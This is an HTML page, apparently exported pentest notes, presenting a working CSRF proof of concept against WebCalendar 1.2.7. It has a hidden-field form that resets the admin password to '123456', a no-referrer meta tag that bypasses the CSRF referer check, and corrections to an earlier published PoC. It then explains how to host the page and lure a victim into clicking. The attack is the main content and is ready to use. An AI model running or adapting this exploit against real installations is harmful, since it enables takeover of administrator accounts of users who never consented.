<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>POC: Exploit Vulnerability</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>POC: Exploit Vulnerability</h1><br/><br /><strong>Complete POC</strong><br />With this POC if an user click on our malicious link, the password will be changed to a new one of our choice<br />Note that the original POC code of @hyp3rlinx has some bugs (<a href="http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt">link</a>)<br />   1) Note there is no &#39;submit&#39; button or any direct way for the user to send the POST<br />   2) The password boxes are ﬁlled in. We certainly don&#39;t want our victim to see those!<br />   3) Bug in the HTML5 referer setting. The &#39;meta-name=&quot;referrer&quot;&#39; content value should be set to &quot;no-referrer&quot; instead of &quot;none&quot;<br />   <a href=""><img src="images/1608-1.png" alt="images/1608-1.png" /></a><br />    The code below has the bug of before solved:<br />    <a href=""><img src="images/1608-2.png" alt="images/1608-2.png" /></a><br />    here the code<br />    <div class="codebox"><pre>&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;<br />&lt;form id=&quot;CSRF&quot; method=&quot;POST&quot; action=&quot;https://example.org/webcalendar/edit_user_handler.php&quot;&gt;<br />&lt;input type=&quot;hidden&quot; name=&quot;formtype&quot; value=&quot;setpassword&quot;&gt;<br />&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;admin&quot;&gt;<br />&lt;input type=&quot;hidden&quot; name=&quot;upassword1&quot; id=&quot;newpass1&quot; type=&quot;password&quot; value=&quot;123456&quot;&gt;<br />&lt;input type=&quot;hidden&quot; name=&quot;upassword2&quot; id=&quot;newpass2&quot; type=&quot;password&quot; value=&quot;123456&quot;&gt;<br />&lt;/form&gt;<br />&lt;button onclick=&quot;document.getElementById(&#39;CSRF&#39;).submit()&quot;&gt;Submit&lt;/button&gt;</pre></div><br /><br /><strong>Exploit</strong><br />Save this POC as html file and upload on a WebApplication on our under control, send the link to a victim user. <br />When the user will open the page will see:<br />    <a href=""><img src="images/1608-3.png" alt="images/1608-3.png" /></a><br />And if he click submit the user admin&#39;s password has been changed to ‘123456’<br />    <a href=""><img src="images/1608-4.png" alt="images/1608-4.png" /></a><br /><br />Bibliography:<br />• <a href="https://packetstormsecurity.com/files/137762/WebCalendar-1.2.7-CSRF-Bypass.html">https://packetstormsecurity.com/files/137762/WebCalendar-1.2.7-CSRF-Bypass.html</a><br />• <a href="http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt">http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt</a><br />    <br /></div>
</body>
</html>
